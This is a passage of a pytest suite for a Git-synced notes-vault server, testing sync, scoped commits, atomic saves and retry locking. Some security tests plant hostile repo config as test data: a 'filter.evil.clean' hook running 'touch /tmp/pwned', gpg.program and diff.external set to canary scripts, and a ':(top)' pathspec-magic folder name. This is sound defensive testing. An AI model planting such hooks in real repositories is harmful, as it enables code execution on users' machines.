    git_ops = server_mod.git_ops
    async with signed_client(server_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        # Advance the remote through the seed checkout so the clone is behind.
        (seed / "remote2.md").write_text("# remote2\n", encoding="utf-8")
        _git("add", "-A", cwd=seed)
        _git("commit", "-m", "remote2", cwd=seed)
        _git("push", "origin", "main", cwd=seed)
        # Diverge locally and force ff-only, so the merge refuses with no
        # conflicted paths to resolve.
        (root / "local2.md").write_text("# local2\n", encoding="utf-8")
        _git("config", "--local", "merge.ff", "only", cwd=root)
        with pytest.raises(git_ops.GitError):
            await git_ops.sync(str(root), branch="main")


@pytest.mark.asyncio
@pytest.mark.skipif(
    os.name == "nt",
    reason="':' is illegal in Windows filenames — a pathspec-magic-named folder cannot exist",
)
async def test_auto_commit_subfolder_is_literal_not_pathspec_magic(fixtures) -> None:
    """A subfolder whose name resembles Git pathspec magic (e.g. `:(top)`) must
    be staged literally; `git add` must not reinterpret it and sweep in
    unrelated repo changes from elsewhere in the tree."""
    server_mod, remote, _seed = fixtures
    git_ops = server_mod.git_ops
    async with signed_client(server_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        magic = root / ":(top)"
        magic.mkdir()
        (magic / "note.md").write_text("# scoped\n", encoding="utf-8")
        # An unrelated dirty file OUTSIDE the subfolder. If the pathspec were
        # read as magic (`:(top)` = "from the repo root"), add would stage it.
        (root / "unrelated.md").write_text("# do not commit me\n", encoding="utf-8")

        await git_ops.auto_commit(str(root), subfolder=":(top)")

        # The unrelated file must remain untracked — never staged or committed.
        porcelain = _git("status", "--porcelain", cwd=root)
        assert "unrelated.md" in porcelain and "?? " in porcelain, porcelain
        committed = _git("show", "--name-only", "--format=", "HEAD", cwd=root)
        assert "unrelated.md" not in committed, committed
        assert "note.md" in committed, committed


@pytest.mark.asyncio
async def test_probe_allows_worktree_pointing_at_the_vault(fixtures) -> None:
    """A benign core.worktree (git writes one for submodule / separate-git-dir
    checkouts, pointing back at the checkout) must NOT be refused."""
    server_mod, remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        # Point core.worktree at the vault itself — git's effective worktree is
        # unchanged, so it is not a redirect.
        _git("config", "--local", "core.worktree", str(root), cwd=root)
        assert await git_ops.repo_supplied_driver(str(root)) == ""


@pytest.mark.asyncio
async def test_status_refuses_a_repo_with_drivers(fixtures) -> None:
    """Reading status must refuse a driver-defining repo, not just sync.

    A repo-defined `clean` filter fires during the working-tree diff, so the
    notes listing (refresh_statuses -> status) reaches the same execution
    surface that sync's own refusal covers.
    """
    server_mod, remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        _git("config", "--local", "filter.evil.clean", "touch /tmp/pwned", cwd=root)
        with pytest.raises(git_ops.GitError):
            await git_ops.status(str(root))


@pytest.mark.asyncio
async def test_scoped_commit_leaves_staged_files_uncommitted(fixtures) -> None:
    """A file the user staged elsewhere in the repo must not ride along.

    Staging is already confined to the subfolder, but `git commit` without a
    pathspec commits everything in the index — including work the user staged
    themselves before the sync ran.
    """
    _server_mod, remote, _seed = fixtures
    async with signed_client(_server_mod) as client:
        vault = await _clone(client, remote, subfolder="notes")
        root = Path(vault["localPath"])

        (root / "staged-elsewhere.txt").write_text("user's own staged work\n", "utf-8")
        _git("add", "staged-elsewhere.txt", cwd=root)
        (root / "notes").mkdir(exist_ok=True)
        (root / "notes" / "inside.md").write_text("# inside the scope\n", "utf-8")

        status, body = await client.post(f"/api/sync?vault={vault['id']}", {})
        assert status == 200, body

        committed = _git("ls-tree", "-r", "HEAD", "--name-only", cwd=root).split()
        assert "notes/inside.md" in committed
        assert "staged-elsewhere.txt" not in committed, "unrelated staged file was committed"
        still_staged = _git("diff", "--cached", "--name-only", cwd=root).split()
        assert "staged-elsewhere.txt" in still_staged, "the user's staged work must survive"


@pytest.mark.asyncio
async def test_sync_allows_a_repo_without_drivers(fixtures) -> None:
    """The probe must not refuse an ordinary vault."""
    server_mod, remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        vault = await _clone(client, remote)
        (Path(vault["localPath"]) / "note.md").write_text("# fine\n", "utf-8")
        status, body = await client.post(f"/api/sync?vault={vault['id']}", {})
        assert status == 200, body


@pytest.mark.asyncio
async def test_repo_gpg_program_is_not_executed_on_sync(fixtures, tmp_path: Path) -> None:
    """A vault's gpg.program must never run during sync, even via merge signing.

    Config neutralizers are not enough: `branch.<name>.mergeOptions=-S` injects
    signing into the merge and a command-line option overrides config. The
    merge/push/commit invocations pass `--no-gpg-sign` / `--no-verify-signatures`
    / `--no-signed` on the argv, which win over both.
    """
    if os.name == "nt":
        pytest.skip("gpg.program canary script is POSIX")
    _mod, remote, seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        canary = tmp_path / "gpg-ran"
        prog = tmp_path / "fake-gpg.sh"
        prog.write_text(f'#!/bin/sh\ntouch "{canary}"\n', encoding="utf-8")
        prog.chmod(0o755)
        # Attacker-controlled vault config: force signing + verification and
        # point gpg at the canary, including the mergeOptions=-S override.
        _git("config", "gpg.program", str(prog), cwd=root)
        _git("config", "commit.gpgSign", "true", cwd=root)
        _git("config", "branch.main.mergeOptions", "-S", cwd=root)
        _git("config", "merge.verifySignatures", "true", cwd=root)
        _git("config", "push.gpgSign", "true", cwd=root)
        # Advance the remote so sync must MERGE (the exploited path).
        (seed / "remote-add.md").write_text("# remote\n", encoding="utf-8")
        _git("add", "-A", cwd=seed)
        _git("commit", "-m", "remote change", cwd=seed)
        _git("push", "origin", "main", cwd=seed)
        # A local edit so sync also commits, then merges the remote.
        (root / "local.md").write_text("# local\n", encoding="utf-8")

        status, body = await client.post(f"/api/sync?vault={vault['id']}", {})
        assert status == 200, body
        assert not canary.exists(), "gpg.program was executed during sync"


@pytest.mark.asyncio
async def test_repo_diff_external_is_not_executed(fixtures, tmp_path: Path) -> None:
    """A vault's `diff.external=<payload>` must not run when the note listing
    computes status via `git diff` — the invocation passes `--no-ext-diff`."""
    if os.name == "nt":
        pytest.skip("diff.external canary script is POSIX")
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        canary = tmp_path / "diff-ran"
        prog = tmp_path / "fake-diff.sh"
        prog.write_text(f'#!/bin/sh\ntouch "{canary}"\n', encoding="utf-8")
        prog.chmod(0o755)
        _git("config", "diff.external", str(prog), cwd=root)
        # A working-tree change makes `git diff HEAD` produce output (and would
        # invoke diff.external without --no-ext-diff).
        (root / "One.md").write_text("# One\n\nedited\n", encoding="utf-8")
        status, body = await client.get(f"/api/notes?vault={vault['id']}")
        assert status == 200, body
        assert not canary.exists(), "diff.external was executed during status"


@pytest.mark.asyncio
async def test_a_failed_save_leaves_the_previous_note_intact(fixtures) -> None:
    """A write that dies partway must not destroy what was already there.

    `write_text` truncates before writing, so a full disk would leave the note
    empty or half-written. The temp-then-rename path keeps the old bytes until
    the new ones are completely on disk.
    """
    server_mod, remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        note = root / "keep.md"
        note.write_text("# original content\n", "utf-8")

        boom = OSError("No space left on device")
        original = note.read_text("utf-8")

        # A write that dies after opening the temp file: the original must be
        # untouched and no temp left behind to be mistaken for a note.
        with pytest.MonkeyPatch.context() as mp:
            real_open = open

            def exploding_open(*args, **kwargs):  # type: ignore[no-untyped-def]
                fh = real_open(*args, **kwargs)
                fh.write("partial")
                raise boom

            mp.setattr("builtins.open", exploding_open)
            with pytest.raises(OSError):
                server_mod._atomic_write_text_sync(note, "replacement")

        assert note.read_text("utf-8") == original
        assert not (root / "keep.md.tmp").exists()


@pytest.mark.asyncio
async def test_a_contended_rename_does_not_lose_the_save(fixtures) -> None:
    """A vault is a directory other processes hold open; a save must survive it.

    On Windows ``os.replace`` raises ``PermissionError`` while ANY other handle is
    open on either path. For a note that is expected rather than exotic: these are
    Obsidian vaults, so the user's editor is often holding the file, and Windows
    Search and AV both touch a freshly written one. A bare rename turns that
    transient into a failed save -- the user loses what they just typed.

    The other half of the contract is pinned by the test below: when the
    contention coincides with a real external edit, the retry must yield to it
    instead of publishing. Here nothing else changed the file, so the save is
    simply completed.
    """
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        _, read = await client.get("/api/note?path=One.md")
        target = Path(vault["localPath"]) / "One.md"

        attempts: list[int] = []
        real_replace = os.replace

        def contended_once(src, dst, *args, **kwargs):  # type: ignore[no-untyped-def]
            attempts.append(1)
            if len(attempts) == 1:
                # WinError 32, the sharing violation this retry exists for --
                # and no external edit, so the file is unchanged between attempts.
                raise PermissionError(32, "The process cannot access the file")
            return real_replace(src, dst, *args, **kwargs)

        with pytest.MonkeyPatch.context() as mp:
            # The retry is Windows-only and backs off; select that branch on every
            # platform and zero the wait so it costs no wall clock.
            mp.setattr(_mod.platform_compat, "IS_WINDOWS", True)
            mp.setattr(_mod, "_SAVE_BACKOFF_SECONDS", 0.0)
            mp.setattr(_mod.os, "replace", contended_once)
            status, body = await client.put(
                "/api/note",
                {"path": "One.md", "content": "mine", "baseMtime": read["mtime"]},
            )

        assert status == 200, f"a transient sharing violation lost the save: {body}"
        assert target.read_text(encoding="utf-8") == "mine"
        assert len(attempts) == 2, f"expected one retry, saw {len(attempts)} attempt(s)"
        assert not list(target.parent.glob("One.md.*.tmp")), "a temp file was left behind"


@pytest.mark.asyncio
async def test_a_contended_save_leaves_no_temp_behind(fixtures) -> None:
    """A successful save must not leave a generated temp in the vault.

    The cleanup after a refused rename is best-effort: if the same handle that
    blocked the rename also blocks the unlink, the temp survives. Staging a FRESH
    temp per attempt then meant a contended save could answer 200 with an orphan
    ``One.md.<uuid>.tmp`` still sitting in the vault -- and nothing would tell the
    user to look, because the save reported success.

    That orphan is not inert. A user-initiated Sync stages every change
    ``status()`` reports; only the unattended autosave is narrowed to ``.md``. So
    the generated temp reaches a commit, and a push puts it on the remote.

    One temp per save transaction removes the failure mode rather than cleaning
    up after it: the same staged file is republished by each attempt, so success
    consumes it.
    """
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        target = root / "One.md"
        _, read = await client.get("/api/note?path=One.md")

        renames: list[str] = []
        real_replace = os.replace
        real_unlink = os.unlink

        def contended_once(src, dst, *args, **kwargs):  # type: ignore[no-untyped-def]
            renames.append(str(src))
            if len(renames) == 1:
                raise PermissionError(32, "The process cannot access the file")
            return real_replace(src, dst, *args, **kwargs)

        def unlink_refused(path, *args, **kwargs):  # type: ignore[no-untyped-def]
            # The handle that blocked the rename blocks the cleanup too, which is
            # the whole reason an orphan can survive.
            if str(path).endswith(".tmp"):
                raise PermissionError(32, "The process cannot access the file")
            return real_unlink(path, *args, **kwargs)

        with pytest.MonkeyPatch.context() as mp:
            mp.setattr(_mod.platform_compat, "IS_WINDOWS", True)
            mp.setattr(_mod, "_SAVE_BACKOFF_SECONDS", 0.0)
            mp.setattr(_mod.os, "replace", contended_once)
            mp.setattr(_mod.os, "unlink", unlink_refused)
            status, body = await client.put(
                "/api/note",
                {"path": "One.md", "content": "mine", "baseMtime": read["mtime"]},
            )

        assert status == 200, f"the contended save did not succeed: {body}"
        assert target.read_text(encoding="utf-8") == "mine"

        leftovers = sorted(p.name for p in root.glob("One.md.*.tmp"))
        assert not leftovers, (
            "a save answered 200 while leaving generated temp(s) in the vault, "
            f"which a user Sync would commit: {leftovers}"
        )
        # The retry republished the SAME staged file rather than staging another.
        assert len(set(renames)) == 1, (
            f"each attempt staged its own temp: {sorted(set(renames))}"
        )


@pytest.mark.asyncio
async def test_a_sync_during_the_retry_window_never_commits_the_staged_temp(
    fixtures,
) -> None:
    """A Sync running while a save is between attempts must not commit its temp.

    The save stages content into a sibling temp and renames it over the note. The
    temp is a real untracked file in the user's vault for the whole of that gap,
    and a contended rename stretches the gap across the entire retry budget. A
    user-initiated Sync stages every change ``status()`` reports -- only the
    unattended autosave is narrowed to ``.md`` -- so in that window a second tab
    hitting Sync commits a half-published implementation detail and the push puts
    it on the remote.

    Shortening the window cannot fix this: it is never zero, and the cleanup
    unlink is best-effort precisely because the handle that refused the rename
    commonly refuses it too. ``git_ops.status`` therefore recognises the shape
    ``staged_temp_name`` produces and refuses to report it as an addition.

    Deterministic, never raced: the Sync runs INSIDE the parked backoff, so it is
    guaranteed to land between attempt 1 and attempt 2, and the vault carries a
    genuine non-note change so a Sync that silently did nothing cannot pass.
    """
    _mod, remote, _seed = fixtures
    real_asyncio = asyncio

    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        target = root / "One.md"
        before = target.read_text(encoding="utf-8")
        _, read = await client.get("/api/note?path=One.md")

        # A real user change the whole-scope Sync MUST commit. Without it a Sync
        # that no-opped would satisfy every assertion below.
        (root / "attachment.png").write_bytes(bytes([0x89]) + b"PNG")

        parked = asyncio.Event()
        resume = asyncio.Event()
        parkings: list[int] = []
        attempts: list[str] = []
        real_replace = os.replace

        def contended_once(src, dst, *args, **kwargs):  # type: ignore[no-untyped-def]
            # Scoped to THIS note's publish. `os` is a shared module object, so
            # the patch is global: the Sync driven from inside the retry gap runs
            # git and rebuilds the cache, and those renames must neither absorb
            # the injected failure nor be counted as attempts.
            if str(dst).endswith("One.md"):
                attempts.append(str(src))
                if len(attempts) == 1:
                    raise PermissionError(32, "The process cannot access the file")
            return real_replace(src, dst, *args, **kwargs)

        class _GatedAsyncio:
            """The real asyncio with the FIRST backoff parked on an event.

            Only the first: the Sync driven from inside that gap runs through the
            same module reference, and parking its waits too would deadlock the
            test rather than test anything.
            """

            async def sleep(self, delay, *args, **kwargs):  # type: ignore[no-untyped-def]
                parkings.append(1)
                if len(parkings) == 1:
                    parked.set()
                    await resume.wait()
                    return
                await real_asyncio.sleep(delay, *args, **kwargs)

            def __getattr__(self, name):  # type: ignore[no-untyped-def]
                return getattr(real_asyncio, name)

        with pytest.MonkeyPatch.context() as mp:
            mp.setattr(_mod.platform_compat, "IS_WINDOWS", True)
            mp.setattr(_mod.os, "replace", contended_once)
            mp.setattr(_mod, "asyncio", _GatedAsyncio())

            save = real_asyncio.create_task(
                client.put(
                    "/api/note",
                    {"path": "One.md", "content": "mine", "baseMtime": read["mtime"]},
                )
            )
            await real_asyncio.wait_for(parked.wait(), timeout=5)

            # The exposure is real and present RIGHT NOW: the temp is on disk and
            # git reports it as untracked. Asserting it keeps the rest of this
            # test from passing because nothing was ever staged.
            staged = [q.name for q in root.glob("One.md.*.tmp")]
            assert len(staged) == 1, f"expected one staged temp, saw {staged}"
            porcelain = _git("status", "--porcelain", "--untracked-files=all", cwd=root)
            assert staged[0] in porcelain, (
                f"git cannot see the temp, so this proves nothing: {porcelain!r}"
            )

            # A second tab hits Sync while the first save backs off.
            sync_status, sync_body = await client.post("/api/sync")
            assert sync_status == 200, sync_body
            committed = [c["path"] for c in sync_body["result"]["committed"]]

            resume.set()
            save_status, save_body = await real_asyncio.wait_for(save, timeout=5)

    assert committed == ["attachment.png"], (
        f"a Sync inside the retry backoff staged a generated temp: {committed}"
    )
    assert staged[0] not in _git("ls-files", cwd=root), "the temp entered local history"
    assert staged[0] not in _git(
        "ls-tree", "-r", "--name-only", "HEAD", cwd=Path(remote)
    ), "the temp was pushed to the remote"

    # The Sync committed against the note as it stood BEFORE the retry finished,
    # and the save still lands afterwards: the filter costs the save nothing.
    assert _git("show", "HEAD:One.md", cwd=root) == before.rstrip()
    assert save_status == 200, f"the contended save was lost: {save_body}"
    assert target.read_text(encoding="utf-8") == "mine"
    assert len(attempts) == 2, f"expected one retry, saw {len(attempts)} attempt(s)"
    # Both attempts republished the one staged temp the Sync just declined to see.
    assert set(attempts) == {str(root / staged[0])}, f"the temp changed: {attempts}"
    assert not list(root.glob("One.md.*.tmp")), "a temp survived a successful save"


@pytest.mark.asyncio
async def test_a_sync_while_the_temp_is_still_staging_never_commits_it(
    fixtures,
) -> None:
    """Registration must precede the worker thread creating the temp.

    The retry-window test above begins only after staging returns. A large note
    exposes an earlier window: ``open`` creates the untracked temp, then the
    worker can spend arbitrarily long writing and fsyncing it before returning
    to the coroutine that used to register it. A Sync in that interval could
    commit a partial implementation detail.

    Deterministic: the staging worker writes the real temp and parks BEFORE it
    returns. Sync runs while the file is definitely present and the save caller
    is definitely still awaiting staging.
    """
    _mod, remote, _seed = fixtures
    real_asyncio = asyncio

    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        target = root / "One.md"
        _, read = await client.get("/api/note?path=One.md")

        # Prove this is a real whole-scope Sync, not a no-op that happens to
        # report no generated temp.
        (root / "attachment.png").write_bytes(bytes([0x89]) + b"PNG")

        temp_written = threading.Event()
        release_stage = threading.Event()
        staged: list[Path] = []
        real_stage = _mod._stage_note_text_sync

        def parked_stage(tmp, content):  # type: ignore[no-untyped-def]
            real_stage(tmp, content)
            staged_path = Path(tmp)
            # Sync records lastSync through the same generic atomic writer.
            # Park only this note; delaying settings.json would deadlock the
            # request that is meant to inspect the note temp.
            if staged_path.parent == root and staged_path.name.startswith("One.md."):
                staged.append(staged_path)
                temp_written.set()
                if not release_stage.wait(timeout=30):
                    raise AssertionError("test never released the staging worker")

        with pytest.MonkeyPatch.context() as mp:
            mp.setattr(_mod, "_stage_note_text_sync", parked_stage)
            save = real_asyncio.create_task(
                client.put(
                    "/api/note",
                    {"path": "One.md", "content": "mine", "baseMtime": read["mtime"]},
                )
            )

            save_status = 0
            save_body: dict[str, Any] = {}
            try:
                assert await real_asyncio.to_thread(temp_written.wait, 10), (
                    "the save never created its staged temp"
                )
                assert len(staged) == 1 and staged[0].is_file(), staged
                porcelain = _git(
                    "status", "--porcelain", "--untracked-files=all", cwd=root
                )
                assert staged[0].name in porcelain, (
                    "git cannot see the staged temp, so this proves nothing: "
                    f"{porcelain!r}"
                )

                sync_status, sync_body = await client.post("/api/sync")
                assert sync_status == 200, sync_body
                committed = [c["path"] for c in sync_body["result"]["committed"]]
            finally:
                release_stage.set()
                save_status, save_body = await real_asyncio.wait_for(save, timeout=10)

    assert committed == ["attachment.png"], (
        f"a Sync while staging committed a generated temp: {committed}"
    )
    assert staged[0].name not in _git("ls-files", cwd=root), (
        "the staging temp entered local history"
    )
    assert staged[0].name not in _git(
        "ls-tree", "-r", "--name-only", "HEAD", cwd=Path(remote)
    ), "the staging temp was pushed to the remote"
    assert save_status == 200, f"the parked save failed: {save_body}"
    assert target.read_text(encoding="utf-8") == "mine"
    assert not staged[0].exists(), "the temp survived its successful publish"


@pytest.mark.asyncio
async def test_an_external_edit_during_the_retry_window_still_wins(fixtures) -> None:
    """Retrying a contended save must not defeat the stale-write guard.

    The save is an optimistic check-and-write: the client sends the mtime it
    read, the server re-stats under the lock, and an external edit since that read is a
    409 ESTALE rather than a silent overwrite.

    Retrying only the RENAME would stretch the gap between that check and the
    publish across the whole backoff, so an external edit completing inside the
    gap would be overwritten by the next attempt — the guard defeated by the very
    mechanism meant to make saves reliable. The retry therefore re-runs the
    freshness check before each attempt.

    Ordering is forced, not raced: the external write happens INSIDE the injected
    rename failure, so it is guaranteed to land after attempt 1 and before
    attempt 2's re-check.
    """
    _mod, remote, _seed = fixtures
    external = "# One\n\nchanged by another program\n"

    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        _, read = await client.get("/api/note?path=One.md")
        target = Path(vault["localPath"]) / "One.md"

        attempts: list[int] = []
        real_replace = os.replace

        def contended_then_external(src, dst, *args, **kwargs):  # type: ignore[no-untyped-def]
            attempts.append(1)
            if len(attempts) == 1:
                # Another program finishes its write while we are between
                # attempts. Its mtime is pinned forward rather than slept for:
                # two writes can share one filesystem tick, which would make the
                # guard's comparison a coin flip instead of the thing under test.
                target.write_text(external, encoding="utf-8")
                future = target.stat().st_mtime + 5
                os.utime(target, (future, future))
                raise PermissionError(32, "The process cannot access the file")
            return real_replace(src, dst, *args, **kwargs)

        from kiro_crew import atomic_write as aw

        with pytest.MonkeyPatch.context() as mp:
            # Both backoff knobs are zeroed, both with raising=False, so this test
            # asserts the CONTRACT rather than where the retry happens to live.
            # That is what makes it a valid negative control: against a build that
            # retries inside the rename it still runs, and fails because the
            # external edit was published over -- not because a constant was
            # missing from the module.
            mp.setattr(_mod.platform_compat, "IS_WINDOWS", True)
            mp.setattr(aw.platform_compat, "IS_WINDOWS", True)
            mp.setattr(_mod, "_SAVE_BACKOFF_SECONDS", 0.0, raising=False)
            mp.setattr(aw, "_REPLACE_BACKOFF_SECONDS", 0.0, raising=False)
            mp.setattr(_mod.os, "replace", contended_then_external)
            status, body = await client.put(
                "/api/note",
                {"path": "One.md", "content": "mine", "baseMtime": read["mtime"]},
            )

        assert status == 409, f"the external edit was not detected: {status} {body}"
        assert body["code"] == "ESTALE"
        assert target.read_text(encoding="utf-8") == external, (
            "the retry published over an edit made during its own backoff"
        )
        assert "mine" not in target.read_text(encoding="utf-8")
        # The second attempt must never have REACHED the rename: a re-check that
        # runs first turns it into the conflict above. A build that retries the
        # rename alone shows 2 here and has already overwritten the file.
        assert len(attempts) == 1, (
            f"a second publish attempt ran without revalidating: {len(attempts)} attempts"
        )


@pytest.mark.asyncio
async def test_a_retrying_save_without_basemtime_cannot_overwrite_a_later_one(
    fixtures,
) -> None:
    """A contended save must not resurrect itself over a save that already won.

    ``baseMtime`` is optional (``saveNote(..., baseMtime?: number)``) and
    ``_assert_note_is_fresh`` is a no-op without it, so for an unguarded save a
    writer arriving during the retry backoff is invisible to every later attempt.
    Releasing the per-note lock across that backoff therefore let an earlier
    contended save republish over a later one that had already been acknowledged
    with 200 -- rename order ``['A', 'B', 'A']``, final content ``A``.

    Without a token there is nothing to detect the interleave with, so ordering
    is preserved instead: the lock is held across the backoff, which is exactly
    the serialization the un-retried code had.

    Ordering is forced with events and a structural assertion on the lock, never
    slept for.
    """
    _mod, remote, _seed = fixtures
    real_asyncio = asyncio

    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        target = Path(vault["localPath"]) / "One.md"

        a_parked = asyncio.Event()
        release_a = asyncio.Event()
        renames: list[str] = []
        real_replace = os.replace

        def one_contention(src, dst, *args, **kwargs):  # type: ignore[no-untyped-def]
            body = ""
            try:
                body = Path(src).read_text(encoding="utf-8")
            except OSError:
                pass
            renames.append(body)
            if len(renames) == 1:
                raise PermissionError(32, "The process cannot access the file")
            return real_replace(src, dst, *args, **kwargs)

        class _GatedAsyncio:
            """The real asyncio with the retry backoff parked on an event.

            Rebinding the module reference the server holds keeps the
            substitution to this one call site; every other attribute
            (``to_thread``, ``Lock``) proxies through untouched.
            """

            async def sleep(self, _delay, *args, **kwargs):  # type: ignore[no-untyped-def]
                # Park only the FIRST backoff -- A's -- which is what pins the
                # ordering. Later backoffs delegate to a real short wait: after A
                # returns, api_note_save re-reads every note in the vault to
                # recompute backlinks, OUTSIDE the per-note lock, so B's rename
                # can hit a genuine Windows sharing violation there. Production
                # absorbs that with the backoff; collapsing it to zero would burn
                # B's whole budget inside A's read window and make this test fail
                # on an artifact of its own instrumentation.
                if not release_a.is_set():
                    a_parked.set()
                    await release_a.wait()
                    return
                await real_asyncio.sleep(0.01)

            def __getattr__(self, name):  # type: ignore[no-untyped-def]
                return getattr(real_asyncio, name)

        with pytest.MonkeyPatch.context() as mp:
            mp.setattr(_mod.platform_compat, "IS_WINDOWS", True)
            mp.setattr(_mod.os, "replace", one_contention)
            mp.setattr(_mod, "asyncio", _GatedAsyncio())

            task_a = real_asyncio.create_task(
                client.put("/api/note", {"path": "One.md", "content": "A"})
            )
            await real_asyncio.wait_for(a_parked.wait(), timeout=5)

            # A is mid-retry with no freshness token. The note's lock must still
            # be held, so a second save cannot slip in behind it.
            assert _mod._save_lock(str(target)).locked(), (
                "the per-note lock was released during an unguarded retry"
            )

            task_b = real_asyncio.create_task(
                client.put("/api/note", {"path": "One.md", "content": "B"})
            )
            # Yield generously rather than sleeping: if B could interleave it
            # would have completed by now.
            for _ in range(100):
                await real_asyncio.sleep(0)
            assert not task_b.done(), "a later save interleaved into the retry gap"

            release_a.set()
            status_a, body_a = await real_asyncio.wait_for(task_a, timeout=5)
            status_b, body_b = await real_asyncio.wait_for(task_b, timeout=5)

        assert status_a == 200, f'the earlier save failed: {body_a}'
        assert status_b == 200, f'the later save failed: {body_b} renames={renames}'
        # The invariant is ordering, not a retry count: every A attempt precedes
        # every B attempt, so the earlier save can never republish after the later
        # one. An exact count would encode how many times B happened to retry,
        # which depends on a real collision with A post-save vault read.
        assert renames == sorted(renames, key=lambda body: body != "A"), (
            f"an A attempt ran after a B attempt: {renames}"
        )
        assert "A" in renames and "B" in renames, f"both saves must publish: {renames}"
        assert target.read_text(encoding="utf-8") == "B", (
            "an earlier contended save resurrected itself over a later one"
        )


@pytest.mark.asyncio
async def test_a_tokenless_save_stages_inside_the_note_lock(fixtures) -> None:
    """Staging is the slow half of the transaction, so it must be serialized too.

    Without a ``baseMtime`` nothing can DETECT an interleaved writer, so order
    is the only guarantee left -- and order has to cover stage-and-publish, not
    just publish. Staging writes the entire note, so it is exactly where a large
    save is slow: with staging outside the lock, a later save could take the
    lock, publish and answer 200 while the earlier one was still writing its
    temp, and the earlier one then published over it. Both answered 200 and the
    later edit was gone.

    No contention is injected here: this is not about a refused rename. The
    parking point is staging itself, and the assertion is structural -- the
    note's lock is held while A stages, so B cannot start.
    """
    _mod, remote, _seed = fixtures
    real_asyncio = asyncio

    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        target = Path(vault["localPath"]) / "One.md"

        a_staging = threading.Event()
        release_a = threading.Event()
        staged: list[str] = []
        real_stage = _mod._stage_note_text_sync

        def parked_stage(tmp, content):  # type: ignore[no-untyped-def]
            # Runs on a worker thread (`asyncio.to_thread`), so the gate is a
            # threading.Event, not an asyncio one.
            staged.append(content)
            if len(staged) == 1:
                a_staging.set()
                release_a.wait(timeout=10)
            return real_stage(tmp, content)

        with pytest.MonkeyPatch.context() as mp:
            mp.setattr(_mod, "_stage_note_text_sync", parked_stage)

            task_a = real_asyncio.create_task(
                client.put("/api/note", {"path": "One.md", "content": "A"})
            )
            assert await real_asyncio.to_thread(a_staging.wait, 10), (
                "the first save never reached staging"
            )

            # The structural claim: A is only STAGING, has published nothing, and
            # already holds the note's lock.
            assert _mod._save_lock(str(target)).locked(), (
                "a tokenless save staged its temp outside the per-note lock"
            )

            task_b = real_asyncio.create_task(
                client.put("/api/note", {"path": "One.md", "content": "B"})
            )
            # Yield generously rather than sleeping: were the lock free, B would
            # have staged and published by now.
            for _ in range(100):
                await real_asyncio.sleep(0)
            assert staged == ["A"], f"a later save staged while the earlier one held the lock: {staged}"
            assert not task_b.done(), "a later save completed while the earlier one was staging"

            release_a.set()
            status_a, body_a = await real_asyncio.wait_for(task_a, timeout=10)
            status_b, body_b = await real_asyncio.wait_for(task_b, timeout=10)

    assert status_a == 200, f"the earlier save failed: {body_a}"
    assert status_b == 200, f"the later save failed: {body_b}"
    assert staged == ["A", "B"], f"staging order was not preserved: {staged}"
    assert target.read_text(encoding="utf-8") == "B", (
        "the earlier save published over the later one"
    )


@pytest.mark.asyncio
async def test_the_vault_registry_write_also_retries(fixtures) -> None:
    """The registry is re-read by every later request, so it has the same window."""
    from kiro_crew import atomic_write as aw

    server_mod, _remote, _seed = fixtures

    attempts: list[int] = []
    real_replace = os.replace

    def contended_once(src, dst, *args, **kwargs):  # type: ignore[no-untyped-def]
        attempts.append(1)
        if len(attempts) == 1:
            raise PermissionError(32, "The process cannot access the file")
        return real_replace(src, dst, *args, **kwargs)

    with pytest.MonkeyPatch.context() as mp:
        mp.setattr(aw.platform_compat, "IS_WINDOWS", True)
        mp.setattr(aw, "_REPLACE_BACKOFF_SECONDS", 0.0)
        mp.setattr(aw.os, "replace", contended_once)
        await asyncio.to_thread(server_mod._write_vaults_sync, [{"id": "v1"}])

    assert json.loads(server_mod._vaults_json().read_text("utf-8")) == [{"id": "v1"}]
    assert len(attempts) == 2, f"expected one retry, saw {len(attempts)} attempt(s)"


# ---------------------------------------------------------------------------
# Settings store and the server-side auto-sync loop
# ---------------------------------------------------------------------------


def _write_raw_settings(server_mod, content: str) -> None:
    """Drop a literal ``settings.json`` in place, as a hand or agent edit would."""
    path = server_mod._settings_json()
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")


def _default_settings_body(server_mod) -> dict[str, Any]:
    return {
        "autoSync": False,
        "autoSyncMins": server_mod.DEFAULT_AUTO_SYNC_MINS,
        "lastSync": {},
    }


async def _wait_for(predicate: Callable[[], Any], message: str, budget: float = 5.0) -> None:
    """Poll *predicate* until it is truthy, failing loudly if it never is.

    A deadline poll rather than a fixed sleep: a loaded runner starves the loop's
    task, and a fixed sleep would trade the assertion for a flake.
    """
    give_up_at = time.monotonic() + budget
    while not predicate():
        assert time.monotonic() < give_up_at, message
        await asyncio.sleep(0.01)


async def _noop_rebuild(vault: dict[str, Any]) -> dict[str, Any]:
    return {}


async def _no_auth() -> Optional[str]:
    """Stand in for ``resolve_auth`` so no test mints a token from the real gh."""
    return None


def _clean_result() -> dict[str, Any]:
    return {"pushed": True, "pulled": True, "committed": [], "conflicts": []}


@pytest.fixture
def loop_syncer(monkeypatch: pytest.MonkeyPatch):
    """The syncer module with a fast tick and a compressed minute.

    Only the two SCALES are patched, never the schedule arithmetic under test:
    ``TICK_SEC`` is how often settings are re-read, ``SECONDS_PER_MINUTE`` is the
    unit the stored interval is expressed in. Compressing both keeps the real
    ratio between the shortest selectable interval (1 minute) and the longest
